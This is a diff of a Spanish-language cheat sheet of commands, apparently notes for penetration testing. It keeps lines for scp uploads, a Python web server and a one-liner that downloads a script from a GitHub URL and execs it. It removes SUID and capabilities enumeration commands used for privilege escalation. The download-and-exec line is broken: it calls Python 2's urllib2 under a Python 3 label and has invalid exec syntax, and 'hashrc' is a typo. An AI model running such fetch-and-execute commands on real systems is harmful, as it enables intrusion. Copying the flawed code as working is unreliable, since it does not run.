@@ -27,15 +27,8 @@ Enviar archivos en windows:
 	- scp archivo_a_subir.zip <<username>>@<<ip>>:/var/www/example.com/
 Ejecutar código remoto en python 3:
 	- python -c 'import urllib2;r=urllib2.urlopen("https://raw.githubusercontent.com/n00py/ReadingList/master/test.py");exec(http://r.read())'
-Encontrar permiso suid:
-	find \-perm -4000 2>/dev/null
-Archivos para agregar funciones a las consolas:
-	para zsh -> ~/.zshrc
-	para bash -> ~/.hashrc
 Convertir hexadecimal de un archivo:
 	xxd -ps -r
-Capabilities:
-	getcap -r / 2>/dev/null
 Iniciar servidor web python:
 	python3 -m http.server 80
 Iniciar servicio ssh powershell:
